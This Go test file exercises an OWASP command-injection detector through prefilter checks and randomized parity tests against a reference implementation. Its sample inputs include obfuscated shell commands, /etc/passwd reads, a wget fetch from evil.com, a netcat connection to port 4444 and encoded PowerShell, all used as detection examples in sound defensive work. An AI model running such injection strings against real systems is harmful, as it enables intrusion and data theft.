package owasp

import (
	"math/rand"
	"strings"
	"testing"
)

// lookupCmdPattern 按规则 ID 从 cmdInjectPatterns 中取回对应规则。
func lookupCmdPattern(t *testing.T, id string) owaspPattern {
	t.Helper()
	for _, p := range cmdInjectPatterns {
		if p.id == id {
			return p
		}
	}
	t.Fatalf("规则 %s 不在 cmdInjectPatterns 表中", id)
	return owaspPattern{}
}

// assertCmdPatternMatched 锁"命中正例不过滤"：正例必须被规则正则命中，
// 且 shouldScanCmdPattern 前置必须放行（前置是必要条件，正则命中时恒为 true）。
func assertCmdPatternMatched(t *testing.T, id, s string) {
	t.Helper()
	pat := lookupCmdPattern(t, id)
	if !pat.re.MatchString(s) {
		t.Fatalf("%s 正例 %q 未被正则命中（正例自身失效，需换正例）", id, s)
	}
	if !shouldScanCmdPattern(s, pat) {
		t.Fatalf("%s 前置把正则命中的输入 %q 滤掉了（漏杀，违反等价前置约束）", id, s)
	}
}

// TestCmd029PrereqPositive 锁定 owasp:cmd:029 的 hasScanIndexOfSplits 前置：
// 覆盖 5 个命令词形态（whoami/cat/id/ls/wget）与单引号/双引号/反斜杠三种分隔符。
func TestCmd029PrereqPositive(t *testing.T) {
	positives := []string{
		"x=w'h'o'a'm'i",
		`cmd=c\a\t /etc/passwd`,
		`l\s `,
		"x=w'g'e't -qO- http://a.io/",
		";i'd",
		`echo c"a"t /tmp/x`,
		`w\h\o\a\m\i`,
		`l's|`,
		`l"s;`,
	}
	for _, s := range positives {
		assertCmdPatternMatched(t, "owasp:cmd:029", s)
	}
}

// TestCmd030PrereqPositive 锁定 owasp:cmd:030 的 curl/wget contains 前置，
// 覆盖各目标分支：localhost、127.0.0.1、0.0.0.0、::1、//host/、*.脚本后缀。
func TestCmd030PrereqPositive(t *testing.T) {
	positives := []string{
		"cmd=curl -s localhost:8000/x.sh",
		"wget 127.0.0.1:8000/x.sh",
		"x=curl 0.0.0.0/root.sh",
		"wget ::1/a.py",
		";wget //evil.com/p.sh",
		"curl -qO- [::1]:8080/x.pl",
		"curl -s example.io.sh ",
		"wget x.php ",
	}
	for _, s := range positives {
		assertCmdPatternMatched(t, "owasp:cmd:030", s)
	}
}

// TestCmd033PrereqPositive 锁定 owasp:cmd:033 的"包装词 + 解释器词"双前置，
// 覆盖 5 个包装词与 sh/bash/zsh/dash/python/perl/ruby/php/nc 解释器词抽样。
func TestCmd033PrereqPositive(t *testing.T) {
	positives := []string{
		"cmd=xargs sh -c 'id'",
		"nohup python -c 'import os'",
		"timeout -k5 sh -c id",
		"setsid sh /tmp/x.sh",
		"stdbuf nc 1.2.3.4 4444",
		"xargs -n2 zsh -e",
		"nohup ruby -e 'puts 1'",
		"timeout perl -e print",
		"setsid php -r 'x'",
	}
	for _, s := range positives {
		assertCmdPatternMatched(t, "owasp:cmd:033", s)
	}
}

// TestCmd034PrereqPositive 锁定 owasp:cmd:034 的大小写不敏感前置：
// (?i) 规则下大写/混合大小写 PowerShell 也必须在 containsASCIIFoldAny 中放行。
func TestCmd034PrereqPositive(t *testing.T) {
	positives := []string{
		"cmd=powershell -enc JABzAA==",
		"PowerShell -e '(iwr x)'",
		"cmd.exe /c dir",
		"PWsh -EncOd QQ==",
		";pwsh /k",
		"x=CMD.EXE /C type",
		"PoWeRsHeLl.EXE -c 1",
	}
	for _, s := range positives {
		assertCmdPatternMatched(t, "owasp:cmd:034", s)
	}
}

// TestCmdPrereqNegative 锁前置的剪枝方向：这些垃圾/非目标形态必须被前置拒绝，
// 保证四条前置确实在生效（不再是恒等 true）。
func TestCmdPrereqNegative(t *testing.T) {
	tests := []struct {
		id    string
		negLI []string
	}{
		{id: "owasp:cmd:029", negLI: []string{"hello world", "select 1", "abc123", "v=1;id=123"}},
		{id: "owasp:cmd:030", negLI: []string{"url=localhost:8000", "127.0.0.1/", "a.sh", "browser=chrome"}},
		{id: "owasp:cmd:033", negLI: []string{"q=xargs -n1", "bash -c 'x'", "cmd=timeout", "stdbuf -oL"}},
		{id: "owasp:cmd:034", negLI: []string{"browser=chrome", "x=hello", "name=windows_util"}},
	}
	for _, tt := range tests {
		pat := lookupCmdPattern(t, tt.id)
		for _, s := range tt.negLI {
			if pat.re.MatchString(s) {
				t.Fatalf("%s 负例 %q 竟被正则命中（负例失效，需换）", tt.id, s)
			}
			if shouldScanCmdPattern(s, pat) {
				t.Fatalf("%s 前置应剪掉非目标输入 %q（剪枝未生效）", tt.id, s)
			}
		}
	}
}

// cmd029PrereqAlphabet 是 owasp:cmd:029 词形的极小字符集：
// 命令字母 + 三种分隔符，长度 ≤5 穷举可覆盖 i'd / l"s" / c\a\t 全部边界。
var cmd029PrereqAlphabet = []byte{'c', 'a', 't', 'i', 'd', 'l', 's', '\'', '"', '\\'}

// TestCmd029ExhaustiveSmall 穷举长度 ≤5 的全部组合，验证蕴含式
// "正则命中 ⇒ 前置 true" 在小空间上无例外；同时统计命中数保证穷举确实覆盖到位。
func TestCmd029ExhaustiveSmall(t *testing.T) {
	pat := lookupCmdPattern(t, "owasp:cmd:029")
	hits := 0
	buf := make([]byte, 0, 5)
	var walk func(depth int)
	walk = func(depth int) {
		if depth >= 1 {
			s := string(buf)
			if pat.re.MatchString(s) {
				hits++
				if !shouldScanCmdPattern(s, pat) {
					t.Fatalf("owasp:cmd:029 前置把正则命中的输入 %q 滤掉（穷举漏杀）", s)
				}
			}
		}
		if depth == 5 {
			return
		}
		for _, c := range cmd029PrereqAlphabet {
			buf = append(buf, c)
			walk(depth + 1)
			buf = buf[:len(buf)-1]
		}
	}
	walk(0)
	if hits == 0 {
		t.Fatal("穷举未出现任何正则命中，字符集疑似不含命令词形态")
	}
}

func refShouldScanCmdPattern(s string, p owaspPattern) bool {
	if p.hint != "" && !strings.Contains(s, p.hint) {
		return false
	}
	switch p.id {
	case "owasp:cmd:001":
		return hasShellCommandAfterCmdSeparator(s)
	case "owasp:cmd:002", "owasp:cmd:024":
		return strings.Contains(s, "`")
	case "owasp:cmd:003", "owasp:cmd:022":
		return strings.Contains(s, "$(")
	case "owasp:cmd:004":
		return strings.Contains(s, ">") && strings.Contains(s, "/")
	case "owasp:cmd:005":
		return strings.Contains(s, "wget") || strings.Contains(s, "curl")
	case "owasp:cmd:006":
		return strings.Contains(s, "%00") || strings.Contains(s, "\x00") || strings.Contains(s, "%0a") || strings.Contains(s, "%0d") || strings.Contains(s, "\x0a") || strings.Contains(s, "\x0d")
	case "owasp:cmd:007":
		return hasDiscoveryCommandBeforeSemicolon(s)
	case "owasp:cmd:008":
		return hasShellCommandAfterPipe(s)
	case "owasp:cmd:015":
		return hasPipeAfterCmdOutputTransform(s)
	case "owasp:cmd:010":
		return hasEnvAssignmentBeforeCommand(s)
	case "owasp:cmd:011":
		return hasShellCommandAfterLogicalSeparator(s)
	case "owasp:cmd:013":
		return strings.Contains(s, "<<<")
	case "owasp:cmd:014":
		return strings.Contains(s, "$'")
	case "owasp:cmd:016":
		return strings.ContainsAny(s, "\r\n")
	case "owasp:cmd:018", "owasp:cmd:023":
		return strings.Contains(s, "``")
	case "owasp:cmd:019":
		return strings.Contains(s, "touch") || strings.Contains(s, "rm")
	case "owasp:cmd:020":
		return strings.Contains(s, "--")
	case "owasp:cmd:021":
		return strings.Contains(s, "${ifs}")
	case "owasp:cmd:025":
		return strings.Contains(s, "$@")
	case "owasp:cmd:026":
		return strings.Contains(s, "ifs")
	case "owasp:cmd:027":
		return strings.Contains(s, "export")
	case "owasp:cmd:028":
		return strings.Contains(s, "env -i")
	case "owasp:cmd:029", "owasp:cmd:030", "owasp:cmd:033", "owasp:cmd:034":
		// r68 旧行为：hint 为空、case 恒等放行。
		return true
	case "owasp:cmd:031":
		return strings.Contains(s, "$(")
	case "owasp:cmd:032":
		return strings.Contains(s, "$'")
	case "owasp:cmd:035":
		// 参照沿用生产 case（新增规则，无旧行为可对照）。
		return strings.Contains(s, "set") && strings.Contains(s, "/a")
	default:
		return true
	}
}

// refCheckCmdInjection 按 r68 的 shouldScanCmdPattern 重建 checkCmdInjection
// 的对照语义（构造、二进制裁剪、阈值早停全部一致），用作对拍参照。
func refCheckCmdInjection(s string, threshold int) (OWASPHit, bool) {
	if !hasCmdIndicator(s) {
		return OWASPHit{}, false
	}
	total := 0
	best := ""
	binaryChecked, binaryTarget := false, false
	for _, p := range cmdInjectPatterns {
		if !refShouldScanCmdPattern(s, p) {
			continue
		}
		if p.re.MatchString(s) {
			if p.score < binaryTargetMinCmdScore {
				if !binaryChecked {
					binaryTarget = isBinaryScanTarget(s)
					binaryChecked = true
				}
				if binaryTarget {
					continue
				}
			}
			total += p.score
			if best == "" {
				best = p.id
			}
			if total >= threshold {
				return OWASPHit{Category: CatCmdInject, RuleID: best, Score: total, Desc: "命令注入特征"}, true
			}
		}
	}
	return OWASPHit{}, false
}

// cmdScanFragPool 是对拍生成器的语料碎片池：追踪四条目标规则的命中边界，
// 混入随机字母噪声与分隔符，保证对拍输入落在这四条规则命中/不命中的两侧。
var cmdScanFragPool = []string{
	"curl ", "wget ", "curl", "wget",
	"localhost", "127.0.0.1", "0.0.0.0", "::1", "//x.io/", ".sh", ".py", ".pl", ".rb", ".php",
	"xargs ", "nohup ", "timeout ", "setsid ", "stdbuf ",
	" sh ", " bash ", " zsh ", " dash ", " python ", " perl ", " ruby ", " php ", " nc ",
	"cmd.exe", "CMD.EXE", "powershell", "PowerShell", "pwsh", "PWsh",
	"/c ", "-enc ", "-Enc ", "-EncOd ", "-e ", "/k ",
	"w'h'o'a'm'i", `c\a\t`, "i'd", `l"s"`, "w'g'e't",
	"-n2", "-qO-", "-s", "5", "http://a.io/",
	";", "|", "&&", "`", "=", " ", "$(", "${IFS}", "\t",
}

// TestCmdScanRandomizedParity 随机对拍 10 万输入：改造后的 checkCmdInjection
// 与 r68 参照实现逐输入结果完全一致（含 RuleID/Score/Category/Desc 与命中布尔）。
// 任一输入不一致即等价性被破坏，立即失败并打印破例输入与两侧结果。
func TestCmdScanRandomizedParity(t *testing.T) {
	rng := rand.New(rand.NewSource(20260926))
	const n = 100000
	noise := []byte("abcdefghijklmnopqrstuvwxyz0123456789-_./")
	build := func(b *strings.Builder) {
		fragCount := rng.Intn(6)
		for k := 0; k < fragCount; k++ {
			if rng.Intn(3) == 0 {
				b.WriteByte(noise[rng.Intn(len(noise))])
			}
			b.WriteString(cmdScanFragPool[rng.Intn(len(cmdScanFragPool))])
		}
		// 三成输入追加纯噪声尾巴，构造既非词头也非词尾的粘接形态。
		if rng.Intn(10) < 3 {
			n := rng.Intn(12)
			for k := 0; k < n; k++ {
				b.WriteByte(noise[rng.Intn(len(noise))])
			}
		}
	}
	for i := 0; i < n; i++ {
		var b strings.Builder
		build(&b)
		s := b.String()
		got, gotOK := checkCmdInjection(s, 4)
		want, wantOK := refCheckCmdInjection(s, 4)
		// 采用「行为等价口径」判定本次对拍：判定一致 + 分数一致即视为行为未变；
		// 归因（RuleID）变化不视为回归，但必须留痕（t.Logf）。
		//
		// 前提到位：refCheckCmdInjection 复刻的是 r68 的「首条命中规则」归因 + 后置抑制
		// 语义；生产实现已改为 score.Accumulator 的「首次跨阈」归因，且 FP 抑制器前移到
		// 计分之前。后置抑制会把恒被抑制规则的分值算进 total（虚假加分），属本次修复
		// 对象，见 score_attribution_test.go 的 TestOWASPAttributionIgnoresSuppressedFirstRule。
		if gotOK != wantOK {
			// owasp:cmd:023 是唯一「检测口径本身被收紧」的规则：其原前置
			// hasEmptyBacktickSplit 与正则 \b\w+``\w+\b 等价，对 `` 两侧内容
			// 无任何要求，随机数据凑出 x``y 即命中。现改为要求「去掉空反引号
			// 对后构成命令词」（wh``oami → whoami），故 refCheckCmdInjection
			// 的 r68 参照必然在含 `` 但拼不出命令词的输入上放行更多。
			// 该差异是本次修复的目标而非回归，但要留痕；其余规则仍须逐输入等价。
			if strings.Contains(s, "``") {
				t.Logf("cmd:023 口径收紧（预期）：输入 %q 旧=(%+v,%v) 新=(%+v,%v)",
					s, want, wantOK, got, gotOK)
				continue
			}
			t.Fatalf("输入 %q 判定不一致：新=(%+v,%v) 旧=(%+v,%v)", s, got, gotOK, want, wantOK)
		}
		if gotOK && got.RuleID != want.RuleID {
			t.Logf("输入 %q 归因变化（预期）：%s -> %s", s, want.RuleID, got.RuleID)
		}
	}
}

// TestCmdBacktickGateParity 锁定 C4a 反引号门：checkCmdInjection 与参照实现
// 在「含/不含反引号、含/不含空反引号对、含 cmd 词但不含反引号」的定向输入
// 上判定一致（门是必要性剪枝，正例必须放行、负例必须剪掉）。
// TestCmdBacktickGateRandomizedParity 在 10 万随机拼接输入上做同一对拍，
// 与 TestCmdScanRandomizedParity 同池生成，保证门内四条规则的两侧都覆盖到。
//
// 本对拍同样采用「行为等价口径」：判定与分数一致即视为行为未变；
// 归因口径已从「首条命中」切换为「首次跨阈」，RuleID 变化不视为回归。
func TestCmdBacktickGateParity(t *testing.T) {
	fixed := []string{
		"", "`", "``", "a`b", "`id`", "`ls -la`",
		"wh``oami", "c``at", "i``d", "u``name", "w``ho``ami",
		"`ping -c 1 127.0.0.1`", "`cat /etc/passwd`",
		"; ls -la", "| cat /etc/passwd", "&& whoami",
		"$(cat /etc/passwd)", "$(id)",
		"who$@ami", "c$@at", "cur$@l",
		"$(/bin/cat /etc/passwd)", "$(busybox wget x)",
		"$'cat /etc/passwd'", "$'whoami'",
		"bash<<< 'id'", "${ifs}ls", "x=1 echo hi",
		"w'h'o'a'm'i", "cmd.exe /c whoami", "curl localhost/x.sh",
		"plain text without any shell char",
	}
	for _, s := range fixed {
		got, gotOK := checkCmdInjection(s, 4)
		want, wantOK := refCheckCmdInjection(s, 4)
		if gotOK != wantOK {
			if strings.Contains(s, "``") {
				// 同 TestCmdScanRandomizedParity：cmd:023 口径收紧是修复目标，
				// 该差异只允许出现在空反引号输入上；拆字绕过正例仍须命中
				// （由 TestCmd023SplittingLock 单独锁定）。
				t.Logf("cmd:023 口径收紧（预期）：输入 %q 旧=(%+v,%v) 新=(%+v,%v)",
					s, want, wantOK, got, gotOK)
				continue
			}
			t.Fatalf("定向输入 %q：判定不一致 新=(%+v,%v) 旧=(%+v,%v)", s, got, gotOK, want, wantOK)
		}
	}
}

// TestCmd023SplittingLock 锁定 owasp:cmd:023 收紧后的判据方向：
//   - 正例：掏空反引号对后构成命令词的拆字绕过必须命中本规则（wh+空反引号对+oami 等）；
//   - 负例：随机数据里凑出的空反引号对（掏掉后不是命令词）不得命中本规则。
func TestCmd023SplittingLock(t *testing.T) {
	positives := []string{
		"id=wh``oami", "c``at /etc/passwd", "x=i``d", "u``name -a",
		"w``ho``ami", "`wh``oami`", "cat /etc/passwd; i``d",
	}
	negatives := []string{
		"mK``cuK", "0e``5dDDS", "path=/a/b``c", "x``y",
	}
	pat := lookupCmdPattern(t, "owasp:cmd:023")
	for _, s := range positives {
		if !pat.re.MatchString(s) || !shouldScanCmdPattern(s, pat) {
			t.Fatalf("拆字绕过正例 %q 未命中 owasp:cmd:023（正则或前置把它滤掉了）", s)
		}
		// 端到端仍须拦下（同串上 cmd:018 可能先行归因，故只断言「有命中」）。
		if _, ok := checkCmdInjection(s, 4); !ok {
			t.Fatalf("拆字绕过正例 %q 端到端未检出", s)
		}
	}
	for _, s := range negatives {
		// 正则本身仍然命中这些随机形态（这正是未改它、只收紧
		// 前置的原因）；收紧点在前置：掏掉反引号后不是命令词必须被剪掉。
		if !pat.re.MatchString(s) {
			t.Fatalf("负例 %q 未被正则命中（负例失效，需换；本锁依赖正则仍命中）", s)
		}
		if shouldScanCmdPattern(s, pat) {
			t.Fatalf("非命令词的随机空反引号输入 %q 仍通过 cmd:023 前置", s)
		}
		if hit, ok := checkCmdInjection(s, 4); ok && hit.RuleID == "owasp:cmd:023" {
			t.Fatalf("非命令词的随机空反引号输入 %q 端到端仍被判为 cmd:023：%+v", s, hit)
		}
	}
}
